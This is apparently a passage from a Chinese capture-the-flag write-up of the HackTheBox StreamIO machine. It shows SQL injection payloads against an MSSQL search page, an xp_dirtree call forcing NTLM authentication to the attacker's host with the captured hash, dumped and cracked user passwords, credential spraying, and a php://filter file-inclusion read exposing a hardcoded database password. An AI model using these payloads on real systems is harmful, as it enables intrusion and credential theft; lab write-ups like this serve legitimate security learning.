 GET       40l      156w     1895c https://streamio.htb/admin/css/%20</span><br><span class="line">404      GET       40l      156w     1894c https://streamio.htb/admin/js/%20</span><br><span class="line">404      GET       40l      156w     1897c https://streamio.htb/admin/fonts/%20</span><br><span class="line">400      GET       80l      276w     3420c https://streamio.htb/admin/*checkout*</span><br><span class="line">400      GET       80l      276w     3420c https://streamio.htb/admin/images/*checkout*</span><br><span class="line">400      GET       80l      276w     3420c https://streamio.htb/admin/css/*checkout*</span><br><span class="line">400      GET       80l      276w     3420c https://streamio.htb/admin/js/*checkout*</span><br><span class="line">400      GET       80l      276w     3420c https://streamio.htb/admin/fonts/*checkout*</span><br></pre></td></tr></table></figure>

<p>尝试访问，一个电影管理页面，但是提示只能通过包含访问，听迷惑的一个页面</p>
<p><img src="/wpimages/2024/tracks-ad/StreamIO/image-22.png" alt="alt text"></p>
<p>再去看一下首页的login，简单试了下注入和闭合没有反应</p>
<p><img src="/wpimages/2024/tracks-ad/StreamIO/image-3.png" alt="alt text"></p>
<p>这里还有个注册账号</p>
<p><img src="/wpimages/2024/tracks-ad/StreamIO/image-4.png" alt="alt text"></p>
<p>简单注册了一个账号</p>
<p><img src="/wpimages/2024/tracks-ad/StreamIO/image-5.png" alt="alt text"></p>
<p>然后点击下面的login，给跳到了user-login.html</p>
<p><img src="/wpimages/2024/tracks-ad/StreamIO/image-6.png" alt="alt text"></p>
<p>这个页面不存在，可能是模拟的站点还没开发完之类的情况</p>
<p>这里就没有什么可以利用的点了，联系部分也没有钓鱼可以用</p>
<h2 id="watch-streamio-htb"><a href="#watch-streamio-htb" class="headerlink" title="watch.streamio.htb"></a>watch.streamio.htb</h2><p><img src="/wpimages/2024/tracks-ad/StreamIO/image-7.png" alt="alt text"></p>
<p>也是先跑一下目录</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line">└─$ dirsearch  -u https://watch.streamio.htb/</span><br><span class="line">/usr/lib/python3/dist-packages/dirsearch/dirsearch.py:23: DeprecationWarning: pkg_resources is deprecated as an API. See https://setuptools.pypa.io/en/latest/pkg_resources.html</span><br><span class="line">  from pkg_resources import DistributionNotFound, VersionConflict</span><br><span class="line"></span><br><span class="line">  _|. _ _  _  _  _ _|_    v0.4.3</span><br><span class="line"> (_||| _) (/_(_|| (_| )</span><br><span class="line"></span><br><span class="line">Extensions: php, aspx, jsp, html, js | HTTP method: GET | Threads: 25 | Wordlist size: 11460</span><br><span class="line"></span><br><span class="line">Output File: /home/fonllge/Desktop/htb/StreamIO/reports/https_watch.streamio.htb/__24-12-30_07-47-23.txt</span><br><span class="line"></span><br><span class="line">Target: https://watch.streamio.htb/</span><br><span class="line"></span><br><span class="line">[07:47:23] Starting:</span><br><span class="line">[07:47:26] 403 -  312B  - /%2e%2e//google.com</span><br><span class="line">[07:47:26] 403 -  312B  - /.%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd</span><br><span class="line">[07:47:34] 403 -  312B  - /\..\..\..\..\..\..\..\..\..\etc\passwd</span><br><span class="line">[07:47:37] 404 -    2KB - /admin%20/</span><br><span class="line">[07:47:38] 404 -    2KB - /admin.</span><br><span class="line">[07:47:47] 404 -    2KB - /asset..</span><br><span class="line">[07:47:50] 403 -  312B  - /cgi-bin/.%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd</span><br><span class="line">[07:47:55] 400 -    3KB - /docpicker/internal_proxy/https/127.0.0.1:9043/ibm/console</span><br><span class="line">[07:47:58] 200 -    1KB - /favicon.ico</span><br><span class="line">[07:48:02] 404 -    2KB - /index.php.</span><br><span class="line">[07:48:03] 404 -    2KB - /javax.faces.resource.../</span><br><span class="line">[07:48:03] 400 -    3KB - /jolokia/exec/com.sun.management:type=DiagnosticCommand/vmLog/disable</span><br><span class="line">[07:48:03] 400 -    3KB - /jolokia/exec/com.sun.management:type=DiagnosticCommand/help/*</span><br><span class="line">[07:48:03] 400 -    3KB - /jolokia/exec/com.sun.management:type=DiagnosticCommand/jfrStart/filename=!/tmp!/foo</span><br><span class="line">[07:48:03] 400 -    3KB - /jolokia/exec/com.sun.management:type=DiagnosticCommand/compilerDirectivesAdd/!/etc!/passwd</span><br><span class="line">[07:48:03] 400 -    3KB - /jolokia/exec/com.sun.management:type=DiagnosticCommand/vmLog/output=!/tmp!/pwned</span><br><span class="line">[07:48:03] 400 -    3KB - /jolokia/exec/com.sun.management:type=DiagnosticCommand/jvmtiAgentLoad/!/etc!/passwd</span><br><span class="line">[07:48:03] 400 -    3KB - /jolokia/exec/com.sun.management:type=DiagnosticCommand/vmSystemProperties</span><br><span class="line">[07:48:03] 400 -    3KB - /jolokia/exec/java.lang:type=Memory/gc</span><br><span class="line">[07:48:03] 400 -    3KB - /jolokia/read/java.lang:type=*/HeapMemoryUsage</span><br><span class="line">[07:48:03] 400 -    3KB - /jolokia/read/java.lang:type=Memory/HeapMemoryUsage/used</span><br><span class="line">[07:48:03] 400 -    3KB - /jolokia/search/*:j2eeType=J2EEServer,*</span><br><span class="line">[07:48:03] 400 -    3KB - /jolokia/write/java.lang:type=Memory/Verbose/true</span><br><span class="line">[07:48:05] 404 -    2KB - /login.wdm%2e</span><br><span class="line">[07:48:16] 404 -    2KB - /rating_over.</span><br><span class="line">[07:48:18] 200 -  248KB - /search.php</span><br><span class="line">[07:48:21] 301 -  157B  - /static  -&gt;  https://watch.streamio.htb/static/</span><br><span class="line">[07:48:21] 404 -    2KB - /static..</span><br><span class="line">[07:48:25] 403 -    2KB - /Trace.axd</span><br></pre></td></tr></table></figure>

<p>跑出来一个<code>search.php</code>，看起来是一些电影的名字。</p>
<p><img src="/wpimages/2024/tracks-ad/StreamIO/image-8.png" alt="alt text"></p>
<p>因为这里是搜索框，所以尝试首先尝试模糊匹配注入。</p>
<p>这里我给的payload如下，先尝试模糊匹配12前后。</p>
<p><code>%12%</code></p>
<p><img src="/wpimages/2024/tracks-ad/StreamIO/image-9.png" alt="alt text"></p>
<p>进一步确定，所以去掉右侧的%，他就会仅显示12结尾的，但是并没有效果，猜测可能是后面有拼接</p>
<p><code>%12</code></p>
<p><img src="/wpimages/2024/tracks-ad/StreamIO/image-10.png" alt="alt text"></p>
<p>所以给注释掉再一次尝试，闭合注释之后成功返回，可以确定是有注入</p>
<p><code>%12&#39;--</code></p>
<p><img src="/wpimages/2024/tracks-ad/StreamIO/image-11.png" alt="alt text"></p>
<p>接下来尝试回显。</p>
<p>我一开始用的，这个payload然后给我ban了</p>
<p><code>&#39; union select order by 1--</code></p>
<p><img src="/wpimages/2024/tracks-ad/StreamIO/image-13.png" alt="alt text"></p>
<p>尝试之后发现他应该是匹配到<code>or</code>就ban</p>
<p>所以<code>union select</code>挨个试，在试到6个columns出现回显</p>
<p><code>%12&#39;  union select 1,2,3,4,5,6;--</code></p>
<p><img src="/wpimages/2024/tracks-ad/StreamIO/image-12.png" alt="alt text"></p>
<p>回显点在<code>2,3</code>,测数据库类型。</p>
<p><code>%12&#39;  union select 1,@@version,3,4,5,6;--</code></p>
<p>是mssql</p>
<p><img src="/wpimages/2024/tracks-ad/StreamIO/image-14.png" alt="alt text"></p>
<p>然后查询当前库,得到<code>streamio</code>，开头那个12有点挡视线所以找个他不存在的内容查，比如这里我的<code>--</code>.</p>
<p><code>--&#39; union select 1,DB_NAME(),3,4,5,6;--</code></p>
<p><img src="/wpimages/2024/tracks-ad/StreamIO/image-15.png" alt="alt text"></p>
<p>进一步看所有库</p>
<p><code>--&#39; union select 1,(SELECT STRING_AGG(name, &#39;, &#39;) FROM master..sysdatabases),3,4,5,6;--</code></p>
<p><code>master, tempdb, model, msdb, STREAMIO, streamio_backup</code></p>
<p><img src="/wpimages/2024/tracks-ad/StreamIO/image-16.png" alt="alt text"></p>
<p>业务库应该就是<code>streamio</code>和<code>streamio_backup</code>.</p>
<p>一会再查库内信息，现尝试拿sql的ntlmv2hash，xp_cmdshell没权限</p>
<p>开responder之后，发dirtree的payload</p>
<p><em>这里我因为打的时候获取到了，所以写wp时候再开需要加个-v不然会跳过不显示</em></p>
<p><code>1&#39;; use master; exec xp_dirtree &#39;\\10.10.16.10\a&#39;;-- </code></p>
<p><img src="/wpimages/2024/tracks-ad/StreamIO/image-17.png" alt="alt text"></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">[SMB] NTLMv2-SSP Client   : 10.10.11.158</span><br><span class="line">[SMB] NTLMv2-SSP Username : streamIO\DC$</span><br><span class="line">[SMB] NTLMv2-SSP Hash     : DC$::streamIO:d91cbd1e70832d18:C5B9360276F58DF143EBC34994D2D6F0:01010000000000008030E94A4C5BDB01C5684C51F540C82E0000000002000800460036003000520001001E00570049004E002D003300380042004600430054004E00430041005000590004003400570049004E002D003300380042004600430054004E0043004100500059002E0046003600300052002E004C004F00430041004C000300140046003600300052002E004C004F00430041004C000500140046003600300052002E004C004F00430041004C00070008008030E94A4C5BDB0106000400020000000800300030000000000000000000000000300000ABB968CD46A65A011B0F694F82C65DB95D07E6D88AC4C8F70A86CBD828E16AA70A001000000000000000000000000000000000000900200063006900660073002F00310030002E00310030002E00310036002E00310030000000000000000000</span><br></pre></td></tr></table></figure>

<p>但是跑不出来这个hash</p>
<p>所以查查这俩库</p>
<h3 id="streamio库"><a href="#streamio库" class="headerlink" title="streamio库"></a>streamio库</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">--&#x27; union select 1,(SELECT STRING_AGG(table_name,&#x27;,&#x27;) from information_schema.tables),3,4,5,6;--</span><br></pre></td></tr></table></figure>

<p><img src="/wpimages/2024/tracks-ad/StreamIO/image-18.png" alt="alt text"></p>
<p>这里关注users表,跑一下字段</p>
<p><code>--&#39; union select 1,(select string_agg(column_name,&#39;,&#39;) from information_schema.columns where table_name=&#39;users&#39;),3,4,5,6;--</code></p>
<p><img src="/wpimages/2024/tracks-ad/StreamIO/image-19.png" alt="alt text"></p>
<p>查表得到账户密码</p>
<p><code>--&#39; union select 1,(select string_agg(concat(username,password),&#39;,&#39;) from users),3,4,5,6;--</code></p>
<p><img src="/wpimages/2024/tracks-ad/StreamIO/image-20.png" alt="alt text"></p>
<p>hashcat跑了下之后user和password对应一下得到字典</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">└─$ cat u_p </span><br><span class="line">Lauren:##123a8j8w5123##</span><br><span class="line">Sabrina:!!sabrina$</span><br><span class="line">Thane:highschoolmusical</span><br><span class="line">Barry:$hadoW</span><br><span class="line">Michelle:!?Love?!123</span><br><span class="line">Victoria:!5psycho8!</span><br><span class="line">Clara:%$clara</span><br><span class="line">Lenord:physics69i</span><br><span class="line">Juliette:$3xybitch</span><br><span class="line">Bruno:$monique$1991$</span><br><span class="line">yoshihide:66boysandgirls..</span><br><span class="line">admin:paddpadd</span><br></pre></td></tr></table></figure>

<p>跑了下kerbrute一个没跑出来，应该是web的登陆密码。</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">└─$ kerbrute bruteforce -d streamio.htb --dc 10.10.11.158 new_up                          </span><br><span class="line"></span><br><span class="line">    __             __               __     </span><br><span class="line">   / /_____  _____/ /_  _______  __/ /____ </span><br><span class="line">  / //_/ _ \/ ___/ __ \/ ___/ / / / __/ _ \</span><br><span class="line"> / ,&lt; /  __/ /  / /_/ / /  / /_/ / /_/  __/</span><br><span class="line">/_/|_|\___/_/  /_.___/_/   \__,_/\__/\___/                                        </span><br><span class="line"></span><br><span class="line">Version: v1.0.3 (9dad6e1) - 12/31/24 - Ronnie Flathers @ropnop</span><br><span class="line"></span><br><span class="line">2024/12/31 13:33:37 &gt;  Using KDC(s):</span><br><span class="line">2024/12/31 13:33:37 &gt;   10.10.11.158:88</span><br><span class="line"></span><br><span class="line">2024/12/31 13:33:37 &gt;  Done! Tested 4 logins (0 successes) <span class="keyword">in</span> 0.144 seconds</span><br></pre></td></tr></table></figure>

<h2 id="streamio-backup"><a href="#streamio-backup" class="headerlink" title="streamio_backup"></a>streamio_backup</h2><p>尝试这个库，直接什么也没查出来，可能是当前权限不够</p>
<p><code>--&#39; union select 1,(SELECT string_agg(table_name,&#39;,&#39;) FROM information_schema.tables WHERE table_catalog=&#39;streamio_backup&#39;),3,4,5,6;--</code></p>
<p><img src="/wpimages/2024/tracks-ad/StreamIO/image-21.png" alt="alt text"></p>
<p>返回去尝试<code>streamio.htb</code>web登录</p>
<p><code>yoshihide:66boysandgirls..</code>可以登录，并且成功访问<code>/admin</code>路径</p>
<p>一共四个功能，除了最后的msg其他都是删东西的</p>
<p><img src="/wpimages/2024/tracks-ad/StreamIO/image-23.png" alt="alt text"></p>
<p>msg参数fuzz了一会没有收获，考虑了下直接fuzz他的参数名，记得这种情况卡住了如果有参数时候一定要尝试fuzz参数。</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line">└─$ ffuf -request meg -w ~/tools/wordlist/SecDictionary/参数字典/关键词字典pro.txt -fs 1678</span><br><span class="line"></span><br><span class="line">        /&#x27;___\  /&#x27;___\           /&#x27;___\</span><br><span class="line">       /\ \__/ /\ \__/  __  __  /\ \__/</span><br><span class="line">       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\</span><br><span class="line">        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/</span><br><span class="line">         \ \_\   \ \_\  \ \____/  \ \_\</span><br><span class="line">          \/_/    \/_/   \/___/    \/_/</span><br><span class="line"></span><br><span class="line">       v2.1.0-dev</span><br><span class="line">________________________________________________</span><br><span class="line"></span><br><span class="line"> :: Method           : GET</span><br><span class="line"> :: URL              : https://streamio.htb/admin/?FUZZ=</span><br><span class="line"> :: Wordlist         : FUZZ: /home/fonllge/tools/wordlist/SecDictionary/参数字典/关键词字典pro.txt</span><br><span class="line"> :: Header           : User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:128.0) Gecko/20100101 Firefox/128.0</span><br><span class="line"> :: Header           : Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/png,image/svg+xml,*/*;q=0.8</span><br><span class="line"> :: Header           : Accept-Language: en-US,en;q=0.5</span><br><span class="line"> :: Header           : Accept-Encoding: gzip, deflate, br</span><br><span class="line"> :: Header           : Upgrade-Insecure-Requests: 1</span><br><span class="line"> :: Header           : Sec-Fetch-Dest: document</span><br><span class="line"> :: Header           : Sec-Fetch-Site: none</span><br><span class="line"> :: Header           : Host: streamio.htb</span><br><span class="line"> :: Header           : Cookie: PHPSESSID=kj17l9d4gc2a09h7s6796sfr6k</span><br><span class="line"> :: Header           : Sec-Fetch-Mode: navigate</span><br><span class="line"> :: Header           : Sec-Fetch-User: ?1</span><br><span class="line"> :: Header           : Priority: u=0, i</span><br><span class="line"> :: Header           : Te: trailers</span><br><span class="line"> :: Follow redirects : false</span><br><span class="line"> :: Calibration      : false</span><br><span class="line"> :: Timeout          : 10</span><br><span class="line"> :: Threads          : 40</span><br><span class="line"> :: Matcher          : Response status: 200-299,301,302,307,401,403,405,500</span><br><span class="line"> :: Filter           : Response size: 1678</span><br><span class="line">________________________________________________</span><br><span class="line"></span><br><span class="line">debug                   [Status: 200, Size: 1712, Words: 90, Lines: 50, Duration: 117ms]</span><br><span class="line">movie                   [Status: 200, Size: 319882, Words: 15969, Lines: 10779, Duration: 123ms]</span><br><span class="line">staff                   [Status: 200, Size: 12484, Words: 1784, Lines: 399, Duration: 129ms]</span><br><span class="line">user                    [Status: 200, Size: 3557, Words: 395, Lines: 111, Duration: 117ms]</span><br><span class="line">:: Progress: [13445/13445] :: Job [1/1] :: 349 req/sec :: Duration: [0:00:41] :: Errors: 0 ::</span><br></pre></td></tr></table></figure>

<p>额外得到了一个debug参数，这个参数存在lfi</p>
<p><img src="/wpimages/2024/tracks-ad/StreamIO/image-24.png" alt="alt text"></p>
<p>那现在的问题就是要读什么了，这里也是fuzz一下，对他在fuzz过程中我发现他会可以读到<code>index.php</code>和<code>master.php</code></p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line">└─$ ffuf -request re -request-proto https -w /usr/share/wordlists/seclists/Discovery/Web-Content/raft-small-files.txt -fs 1712 </span><br><span class="line"></span><br><span class="line">        /<span class="string">&#x27;___\  /&#x27;</span>___\           /<span class="string">&#x27;___\       </span></span><br><span class="line"><span class="string">       /\ \__/ /\ \__/  __  __  /\ \__/       </span></span><br><span class="line"><span class="string">       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      </span></span><br><span class="line"><span class="string">        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      </span></span><br><span class="line"><span class="string">         \ \_\   \ \_\  \ \____/  \ \_\       </span></span><br><span class="line"><span class="string">          \/_/    \/_/   \/___/    \/_/       </span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">       v2.1.0-dev</span></span><br><span class="line"><span class="string">________________________________________________</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string"> :: Method           : GET</span></span><br><span class="line"><span class="string"> :: URL              : https://streamio.htb/admin/?debug=FUZZ</span></span><br><span class="line"><span class="string"> :: Wordlist         : FUZZ: /usr/share/wordlists/seclists/Discovery/Web-Content/raft-small-files.txt</span></span><br><span class="line"><span class="string"> :: Header           : Te: trailers</span></span><br><span class="line"><span class="string"> :: Header           : Host: streamio.htb</span></span><br><span class="line"><span class="string"> :: Header           : Cookie: PHPSESSID=m7l1fc91npfjlo3num48b5fut8</span></span><br><span class="line"><span class="string"> :: Header           : Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/png,image/svg+xml,*/*;q=0.8</span></span><br><span class="line"><span class="string"> :: Header           : Accept-Encoding: gzip, deflate, br</span></span><br><span class="line"><span class="string"> :: Header           : Upgrade-Insecure-Requests: 1</span></span><br><span class="line"><span class="string"> :: Header           : Sec-Fetch-Dest: document</span></span><br><span class="line"><span class="string"> :: Header           : User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:128.0) Gecko/20100101 Firefox/128.0</span></span><br><span class="line"><span class="string"> :: Header           : Accept-Language: en-US,en;q=0.5</span></span><br><span class="line"><span class="string"> :: Header           : Sec-Fetch-Mode: navigate</span></span><br><span class="line"><span class="string"> :: Header           : Sec-Fetch-Site: none</span></span><br><span class="line"><span class="string"> :: Header           : Sec-Fetch-User: ?1</span></span><br><span class="line"><span class="string"> :: Header           : Priority: u=0, i</span></span><br><span class="line"><span class="string"> :: Follow redirects : false</span></span><br><span class="line"><span class="string"> :: Calibration      : false</span></span><br><span class="line"><span class="string"> :: Timeout          : 10</span></span><br><span class="line"><span class="string"> :: Threads          : 40</span></span><br><span class="line"><span class="string"> :: Matcher          : Response status: 200-299,301,302,307,401,403,405,500</span></span><br><span class="line"><span class="string"> :: Filter           : Response size: 1712</span></span><br><span class="line"><span class="string">________________________________________________</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">index.php               [Status: 200, Size: 1693, Words: 93, Lines: 47, Duration: 243ms]</span></span><br><span class="line"><span class="string">Index.php               [Status: 200, Size: 0, Words: 1, Lines: 1, Duration: 984ms]</span></span><br><span class="line"><span class="string">master.php              [Status: 200, Size: 342677, Words: 17754, Lines: 11159, Duration: 289ms]</span></span><br></pre></td></tr></table></figure>

<p>先试index.php，不过被加载了</p>
<p><img src="/wpimages/2024/tracks-ad/StreamIO/image-25.png" alt="alt text"></p>
<p>猜测大概率是个<code>include</code>，打了几个payload没反应，所以还是需要改一下编码读取直接读文件，这里base64一下</p>
<p><code>https://streamio.htb/admin/?debug=php://filter/convert.base64-encode/resource=index.php</code></p>
<p><img src="/wpimages/2024/tracks-ad/StreamIO/image-26.png" alt="alt text"></p>
<p>得到如下(因为太长了我截取了重要的部分)</p>
<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="meta">define(&#x27;included&#x27;,true);</span></span><br><span class="line"><span class="meta">session_start();</span></span><br><span class="line"><span class="meta">if(!isset($_SESSION[&#x27;admin&#x27;]))</span></span><br><span class="line"><span class="meta">&#123;</span></span><br><span class="line"><span class="meta">&#125;</span></span><br><span class="line"><span class="meta">$connection = array(&quot;Database&quot;=&gt;&quot;STREAMIO&quot;, &quot;UID&quot; =&gt; &quot;db_admin&quot;, &quot;PWD&quot; =&gt; &#x27;B1@hx31234567890&#x27;);</span></span><br><span class="line"><span class="meta">$handle = sqlsrv_connect(&#x27;(local)&#x27;,$connection);</span></span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"></span><br><span class="line">                        <span class="tag">&lt;<span class="name">li</span> <span class="attr">class</span>=<span class="string">&quot;nav-item&quot;</span>&gt;</span></span><br><span class="line">                                <span class="tag">&lt;<span class="name">a</span> <span class="attr">class</span>=<span class="string">&quot;nav-link&quot;</span> <span class="attr">href</span>=<span class="string">&quot;?user=&quot;</span>&gt;</span>User management<span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br><span class="line">                        <span class="tag">&lt;/<span class="name">li</span>&gt;</span></span><br><span class="line">                        <span class="tag">&lt;<span class="name">li</span> <span class="attr">class</span>=<span class="string">&quot;nav-item&quot;</span>&gt;</span></span><br><span class="line">                                <span class="tag">&lt;<span class="name">a</span> <span class="attr">class</span>=<span class="string">&quot;nav-link&quot;</span> <span class="attr">href</span>=<span class="string">&quot;?staff=&quot;</span>&gt;</span>Staff management<span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br><span class="line">                        <span class="tag">&lt;/<span class="name">li</span>&gt;</span></span><br><span class="line">                        <span class="tag">&lt;<span class="name">li</span> <span class="attr">class</span>=<span class="string">&quot;nav-item&quot;</span>&gt;</span></span><br><span class="line">                                <span class="tag">&lt;<span class="name">a</span> <span class="attr">class</span>=<span class="string">&quot;nav-link&quot;</span> <span class="attr">href</span>=<span class="string">&quot;?movie=&quot;</span>&gt;</span>Movie management<span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br><span class="line">                        <span class="tag">&lt;/<span class="name">li</span>&gt;</span></span><br><span class="line">                        <span class="tag">&lt;<span class="name">li</span> <span class="attr">class</span>=<span class="string">&quot;nav-item&quot;</span>&gt;</span></span><br><span class="line">                                <span class="tag">&lt;<span class="name">a</span> <span class="attr">class</span>=<span class="string">&quot;nav-link&quot;</span> <span class="attr">href</span>=<span class="string">&quot;?message=&quot;</span>&gt;</span>Leave a message for admin<span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br><span class="line">                        <span class="meta">&lt;?php</span></span><br><span class="line"><span class="meta">                                if(isset($_GET[&#x27;debug&#x27;]))</span></span><br><span class="line"><span class="meta">                                &#123;</span></span><br><span class="line"><span class="meta">                                        echo &#x27;this option is for developers only&#x27;;</span></span><br><span class="line"><span class="meta">                                        if($_GET[&#x27;debug&#x27;] === &quot;index.php&quot;) &#123;</span></span><br><span class="line"><span class="meta">                                                die(&#x27; ---- ERROR ----&#x27;);</span></span><br><span class="line"><span class="meta">                                        &#125; else &#123;</span></span><br><span class="line"><span class="meta">                                                include $_GET[&#x27;debug&#x27;];</span></span><br><span class="line"><span class="meta">                                        &#125;</span></span><br><span class="line"><span class="meta">                                &#125;</span></span><br><span class="line"><span class="meta">                                else if(isset($_GET[&#x27;user&#x27;]))</span></span><br><span class="line"><span class="meta">                                        require &#x27;user_inc.php&#x27;;</span></span><br><span class="line"><span class="meta">                                else if(isset($_GET[&#x27;staff&#x27;]))</span></span><br><span class="line"><span class="meta">                                        require &#x27;staff_inc.php&#x27;;</span></span><br><span class="line"><span class="meta">                                else if(isset($_GET[&#x27;movie&#x27;]))</span></span><br><span class="line"><span class="meta">                                        require &#x27;movie_inc.php&#x27;;</span></span><br><span class="line"><span class="meta">...</span></span><br></pre></td></tr></table></figure>

<p>可以看到这就是当前admin的页面，同时还暴露出一个<code>db_admin</code>的帐号密码记录一下，一会可以撞</p>
<p>然后再读<code>master.php</code>,他index.php中也暴露出一部分php文件如果没进展的话也可以再读这几个</p>
<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">└─$ base64 -d base64_webpage</span><br><span class="line"><span class="tag">&lt;<span class="name">h1</span>&gt;</span>Movie managment<span class="tag">&lt;/<span class="name">h1</span>&gt;</span></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="meta">&lt;br&gt;&lt;hr&gt;&lt;br&gt;</span></span><br><span class="line"><span class="meta">&lt;h1&gt;User managment&lt;/h1&gt;James c660060492d9edcaa8332d89c99c9239 ,Theodore 925e5408ecb67aea449373d668b7359e ,Samantha 083ffae904143c4796e464dac33c1f7d ,Lauren 08344b85b329d7efd611b7a7743e8a09 ,William d62be0dc82071bccc1322d64ec5b6c51 ,Sabrina f87d3c0d6c8fd686aacc6627f1f493a5 ,Robert f03b910e2bd0313a23fdd7575f34a694 ,Thane 3577c47eb1e12c8ba021611e1280753c ,Carmon 35394484d89fcfdb3c5e447fe749d213 ,Barry 54c88b2dbd7b1a84012fabc1a4c73415 